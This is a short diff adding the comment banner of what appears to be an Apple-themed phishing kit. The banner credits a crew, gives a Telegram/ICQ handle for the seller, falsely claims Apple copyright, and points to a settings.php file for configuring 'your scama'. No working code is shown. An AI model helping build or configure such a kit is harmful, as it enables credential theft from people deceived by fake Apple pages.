@@ -1,0 +1,16 @@
+ * DO NOT CHANGE COPYRIGHT !
+ * Apple -
+ * version 03
+ * icq & telegram = @belugaa006
+ 
+###############################################
+#$            C0d3d by AlJone_Team           $#
+#$   Recording doesn't  make you a Coder     $#
+#$          Copyright 2022 Apple             $#
+###############################################
+
+**/
+###############################################
+#$          Config Your Scama :              #$
+#$            \AP\settings.php               #$
+###############################################
